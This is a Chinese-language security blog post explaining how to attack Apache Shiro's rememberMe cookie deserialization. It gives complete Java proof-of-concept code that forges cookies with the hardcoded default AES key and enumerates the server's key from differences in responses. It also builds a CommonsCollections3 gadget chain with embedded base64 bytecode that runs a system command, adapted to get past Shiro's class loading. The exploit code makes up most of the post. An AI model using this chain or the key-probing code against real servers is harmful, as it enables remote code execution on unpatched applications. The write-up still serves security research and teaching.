---
title: "攻击Shiro思路和构造poc"
date: 2021-10-04T23:22:29+08:00
draft: false
image: https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042159119.png
description: 
comments: true
license: false
math: false
categories:
- note
tags:
- Shiro
- Java
- 反序列化
---
## 攻击shiro思路

![75cb74a9191b4a0034d1b8c860740eb6.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042159119.png)

## 伪造加密过程

shiro在容器初始化的时候会实例化CookieRememberMeManager对象，并且设置加密解密方式

![2a73a2116a7ebd6f3ae96cb634795011.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042159712.png)

实例化时调用父类构造方法，设置加密方式为AES，并且设置key

![0fc39f2201b6a8f630c715bb1afff0c6.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042159685.png)

看下调用 栈

```java
<init>:109, AbstractRememberMeManager (org.apache.shiro.mgt)
<init>:87, CookieRememberMeManager (org.apache.shiro.web.mgt)
<init>:75, DefaultWebSecurityManager (org.apache.shiro.web.mgt)
createDefaultInstance:65, WebIniSecurityManagerFactory (org.apache.shiro.web.config)
……
run:748, Thread (java.lang)
```

然后在之前也说过，加密的时候先序列化再用encrypt()方法加密

![993fa60071dabd0240454635d6b9fada.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042159298.png)

所以我们构造poc伪造加密的时候，直接这样就行了：

```java
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class poc {
    public static void main(String []args) throws Exception {
        byte[] payloads = <构造好的序列化流>
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

## 探测shiro key

https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ

> 使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。

```java
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class shirokey {
    public static void main(String []args) throws Exception {

        SimplePrincipalCollection pal = new SimplePrincipalCollection();
        ByteArrayOutputStream brr = new ByteArrayOutputStream();
        ObjectOutputStream obj = new ObjectOutputStream(brr);
        obj.writeObject(pal);
        byte[] payloads = brr.toByteArray();

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        //byte[] key = Base64.getDecoder().decode("acH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());           //自动Base64
    }
}
```

key正确时：

![a36dfe63f20b4427194f50055fea11b0.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042200654.png)

key错误时：

![9300020b5bf9c4eff3d7fd5cfda917ab.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042200806.png)

基于此枚举key

## 使用CC链打shiro

直接拿cc3开梭：

ShiroPoc.java：

```java
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.util.Base64;

public class ShiroPoc {
    public static void main(String []args) throws Exception {
        byte[] payloads = cc3.getpayload();
        //byte[] payloads = CommonsCollectionShiro.getpayload();
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());          //自动Base64
    }
}
```

cc3.java

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class cc3 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        String base64encodedString = Base64.getEncoder().encodeToString(getpayload());
        System.out.println(base64encodedString);
    }

    public static byte[] getpayload() throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAAhjYWxjLmV4ZQwAMgAzAQATamF2YS9pby9JT0V4Y2VwdGlvbgwANAAUAQASSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAKAAsAAAAAAAMAAQAMAA0AAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAAAsAEAAAAAQAAQARAAEADAASAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABABMAFAABAA4AAABsAAIAAgAAAB4qtwABsgACEgO2AAS4AAUSBrYAB1enAAhMK7YACbEAAQAMABUAGAAIAAIADwAAAB4ABwAAAA8ABAAQAAwAEgAVABUAGAATABkAFAAdABYAFQAAABAAAv8AGAABBwAWAAEHABcEAAEAGAAAAAIAGQ==");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};    //避免本地构造报错退出
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { obj })
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);            //避免本地构造报错退出

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");	    //为了调用hashCode()

        outerMap.remove("keykey");		//因为LazyMap触发要求是获取不到这个value，所以要删除

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");       //替换真正的ChainedTransformer
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

//        // 本地测试触发
//        System.out.println(barr);
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object)ois.readObject();

        return barr.toByteArray();
    }
}
```

得到数据之后替换为rememberMe之后并没有执行命令，而是重定向到了首页，开启debug去看，得到一个报错

![f91ddc1b27dbbe4bdca9e4e6165dd392.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042159266.png)

原因是`org.apache.shiro.io.ClassResolvingObjectInputStream`这个类，他是个ObjectInputStream的子类，并且重写了resolveClass方法，这个方法是用于反序列化中寻找Class对象的方法。

ObjectInputStream使用的是`org.apache.shiro.util.ClassUtils#forName`来加载，而shiro的ClassResolvingObjectInputStream使用的是Java原生`Class.forName`，后者会导致ClassNotFoundException

参考p神《Java安全漫谈 - 15.TemplatesImpl在Shiro中的利用》一文：

> 这里仅给出最后的结论:**如果反序列化流中包含非ava自身的数组，则会出现无法加载类的错误**。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。

那么如何避免使用Transformer数组呢？

## 修改CC3打shiro

先康康LazyMap的get方法：

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

再康康ChainedTransformer的transform方法：

```java
public ChainedTransformer(Transformer[] transformers) {
    super();
    iTransformers = transformers;
}
//……
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

再去康康ConstantTransformer的transform方法：

```java
public ConstantTransformer(Object constantToReturn) {
    super();
    iConstant = constantToReturn;
}

public Object transform(Object input) {
    return iConstant;
}
```

本来的触发流程是：

```
LazyMap.get(key)->
ChainedTransformer.transform(constantTransformer)->
ConstantTransformer.transform(instantiateTransformer)->
InstantiateTransformer.transform(TrAXFilter.class)->
TrAXFilter#TrAXFilter()->
……
->RCE
```

但其实LazyMap.get()的时候
`factory.transform(key)`会把key当作transform的参数传入

反观我们cc3里面的transformers数组，**其实他长度只有1**：

```java
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[] { Templates.class },new Object[] {obj})
    };
```

**所以new ConstantTransformer(TrAXFilter.class)这一步完全就可以使用LazyMap.get(TrAXFilter.class)来替代。**也就不需要transformer数组了

给个自己改的poc：

ShiroPoc.java：

```java
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.util.Base64;

public class ShiroPoc {
    public static void main(String []args) throws Exception {
        //byte[] payloads = cc3.getpayload();
        byte[] payloads = CommonsCollectionShiro.getpayload();
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());          //自动Base64
    }
}
```

CommonsCollectionShiro.java：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionShiro {

    public static void main(String[] args) throws Exception {
        String base64encodedString = Base64.getEncoder().encodeToString(getpayload());
        System.out.println(base64encodedString);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getpayload() throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAAhjYWxjLmV4ZQwAMgAzAQATamF2YS9pby9JT0V4Y2VwdGlvbgwANAAUAQASSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAKAAsAAAAAAAMAAQAMAA0AAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAAAsAEAAAAAQAAQARAAEADAASAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABABMAFAABAA4AAABsAAIAAgAAAB4qtwABsgACEgO2AAS4AAUSBrYAB1enAAhMK7YACbEAAQAMABUAGAAIAAIADwAAAB4ABwAAAA8ABAAQAAwAEgAVABUAGAATABkAFAAdABYAFQAAABAAAv8AGAABBwAWAAEHABcEAAEAGAAAAAIAGQ==");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer fakeTransformers = new ConstantTransformer(1);
        Class trAXFilter = TrAXFilter.class;
        Transformer instantiateTransformer = new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { obj });

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeTransformers);

        TiedMapEntry tme = new TiedMapEntry(outerMap, trAXFilter);

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");	                                  //为了调用hashCode()

        outerMap.clear();		                                          //因为LazyMap触发要求是获取不到这个value，所以要删除

        Field f = LazyMap.class.getDeclaredField("factory");       //替换真正的key
        f.setAccessible(true);
        f.set(outerMap, instantiateTransformer);

        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

//        // 本地测试触发
//        System.out.println(barr);
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object)ois.readObject();
        return barr.toByteArray();
    }
}
```

小手一抖，计算器到手

![56925b5f3ee5e3645eb544b3969ff793.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202110042159423.png)
